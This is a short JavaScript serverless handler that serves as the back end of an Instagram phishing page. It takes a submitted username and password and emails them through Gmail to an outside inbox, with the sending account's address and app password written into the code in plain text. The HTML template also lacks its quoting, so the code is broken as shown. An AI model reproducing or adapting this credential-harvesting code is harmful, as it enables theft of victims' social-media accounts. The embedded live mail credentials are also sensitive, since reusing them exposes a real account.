const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    const { username, password } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'cuentaluperonp5@gmail.com',
            pass: 'ogynqksiltkdnuoz',
        },
    });

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com', // Corregido: coma agregada entre los correos
        subject: 'Instagram Ingreso',
        html: 
            <h2>Detalles de Ingreso</h2>
            <p><strong>Usuario:</strong> <span style="word-wrap: break-word;">${username}</span></p>
            <p><strong>Contraseña:</strong> <span style="word-wrap: break-word;">${password}</span></p>
        ,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
